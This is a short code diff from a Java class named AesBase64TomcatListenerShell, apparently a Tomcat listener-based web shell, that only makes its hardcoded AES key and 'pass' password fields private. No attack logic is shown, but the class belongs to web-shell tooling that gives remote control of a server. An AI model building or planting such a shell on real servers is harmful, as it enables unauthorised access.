@@ -6,8 +6,8 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
     private static boolean initialized = false;
     private static final Object lock = new Object();
     private static Class payloadClass;
-    String key = "3c6e0b8a9c15224a";
-    String password = "pass";
+    private String key = "3c6e0b8a9c15224a";
+    private String password = "pass";
 
 
     static {
